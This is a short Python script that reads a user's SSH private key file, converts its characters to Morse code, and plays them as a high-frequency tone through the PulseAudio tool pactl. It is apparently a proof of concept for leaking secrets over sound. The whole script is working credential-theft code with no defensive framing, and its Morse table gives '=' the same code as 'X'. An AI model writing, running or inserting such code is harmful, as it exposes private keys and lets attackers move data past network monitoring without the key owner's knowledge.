import os
from time import sleep
MORSE_CODE_DICT = { 'A':'.-', 'B':'-...',
                    'C':'-.-.', 'D':'-..', 'E':'.',
                    'F':'..-.', 'G':'--.', 'H':'....',
                    'I':'..', 'J':'.---', 'K':'-.-',
                    'L':'.-..', 'M':'--', 'N':'-.',
                    'O':'---', 'P':'.--.', 'Q':'--.-',
                    'R':'.-.', 'S':'...', 'T':'-',
                    'U':'..-', 'V':'...-', 'W':'.--',
                    'X':'-..-', 'Y':'-.--', 'Z':'--..',
                    '1':'.----', '2':'..---', '3':'...--',
                    '4':'....-', '5':'.....', '6':'-....',
                    '7':'--...', '8':'---..', '9':'----.',
                    '0':'-----', ', ':'--..--', '.':'.-.-.-',
                    '?':'..--..', '/':'-..-.', '-':'-....-',
                    '(':'-.--.', ')':'-.--.-'
                    , '+': '.-.-.', '=': "-..-"}


with open("/home/blueudp/.ssh/id_rsa") as f:
    rsa = f.read()
rsa = rsa.replace("\n","")
morselist = []

unidad_tiempo_punto = 0.06


for letter in rsa:
    print(letter)
    morse=""
    if letter == " ":
        continue
    try:
        morse+=MORSE_CODE_DICT[letter.upper()]
    except:
        morse+= MORSE_CODE_DICT[letter.upper()]

    morselist.append(morse)


for i in morselist:
    for j in i:
        if j == ".":
            os.system("pactl load-module module-sine frequency=10000")
            sleep(unidad_tiempo_punto)
            os.system("pactl unload-module module-sine")
        if j == "-":
            os.system("pactl load-module module-sine frequency=10000")
            sleep(unidad_tiempo_punto*3)
            os.system("pactl unload-module module-sine")

        sleep(unidad_tiempo_punto)
    sleep(unidad_tiempo_punto*3)

